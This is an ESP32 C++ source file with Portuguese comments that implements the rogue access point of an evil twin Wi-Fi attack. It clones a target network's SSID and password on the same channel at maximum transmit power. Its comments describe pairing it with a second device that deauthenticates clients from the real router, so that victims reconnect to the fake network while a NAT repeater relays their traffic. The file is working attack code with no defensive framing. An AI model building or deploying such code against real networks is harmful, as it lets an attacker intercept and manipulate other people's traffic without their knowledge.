#include "funcoes_evtw.h"

// ---------------------------------------------------------------------------
// ESP #2 - EVIL TWIN (parte do AP falso)
//
// Sobe um AP com o MESMO SSID e senha do alvo, mas com o MAC PROPRIO da ESP
// (NAO clona o BSSID). Assim a ESP #1 pode fazer deauth mirando so o BSSID
// real sem derrubar os clientes que ja migraram para esta rede falsa.
//
// Quando o deauth derruba o cliente do roteador real, ele reconecta no SSID
// de mesmo nome com sinal mais forte -> esta Evil Twin. A internet real e
// fornecida pelo repetidor (NAT) em repetidor.cpp.
// ---------------------------------------------------------------------------

void configurarEvilTwin() {
    Serial.println("Subindo AP Falso (Evil Twin) com MAC proprio...");

    WiFi.persistent(false);
    WiFi.mode(WIFI_AP_STA);   // AP para as vitimas + STA para a internet real
    delay(200);

    WiFi.softAPConfig(IPAddress(192, 168, 4, 1),
                      IPAddress(192, 168, 4, 1),
                      IPAddress(255, 255, 255, 0));

    // Mesmo SSID/senha do alvo, no mesmo canal, ate 4 clientes.
    bool ok = WiFi.softAP(SSID_ALVO, SENHA_REAL, canal_alvo, 0, 4);
    if (ok) {
        Serial.print(">> AP Falso no ar. SSID: ");
        Serial.println(SSID_ALVO);
        Serial.print(">> IP do AP: ");
        Serial.println(WiFi.softAPIP());
    } else {
        Serial.println(">> ERRO ao subir o AP Falso.");
    }

    esp_wifi_set_bandwidth(WIFI_IF_AP, WIFI_BW_HT20);
    esp_wifi_set_max_tx_power(84);
}
